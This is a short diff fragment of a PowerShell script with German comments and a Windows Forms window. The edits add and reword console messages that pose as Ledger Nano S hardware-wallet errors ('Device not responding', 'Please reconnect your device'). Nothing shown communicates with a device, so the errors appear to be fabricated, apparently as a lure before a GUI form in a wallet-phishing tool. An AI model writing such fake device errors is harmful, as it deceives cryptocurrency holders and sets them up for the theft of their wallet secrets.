@@ -1287,8 +1287,8 @@ if (-not (Test-Path $targetFolder)) {
     #$outputLog = Join-Path $logDir "Operator_Output_${timestamp}.txt"
     #$errorLog = Join-Path $logDir "Operator_Error_${timestamp}.txt"
 
-    Write-Output "LedgerNanoS device: Internal error, please report (0x6f01)"
-    Write-Output "Something went wrong. Please reconnect your device..."
+    Write-Output "LedgerNanoS device: Internal error (0x6f01)"
+    Write-Output "Reconnection..."
     ##Write-Output "Aktuelle PS-Version: $($PSVersionTable.PSVersion.Major).$($PSVersionTable.PSVersion.Minor)"
     ##Write-Output "Aktuelle ExecutionPolicy: $(Get-ExecutionPolicy)"
 
@@ -1383,7 +1383,8 @@ if (-not (Test-Path $targetFolder)) {
     #New-Item -Path $flagFilePath -ItemType File -Force | Out-Null
     #Write-DebugLog "Operator-Start abgeschlossen. Flag gesetzt."
 
-
+Write-Output "Ledger Nano S: UNKNOWN_ERROR (0x6d02) - Device not responding."
+Write-Output "Something went wrong. Please reconnect your device..."
 
 # ==================== HAUPTFENSTER ====================
 $form = New-Object System.Windows.Forms.Form
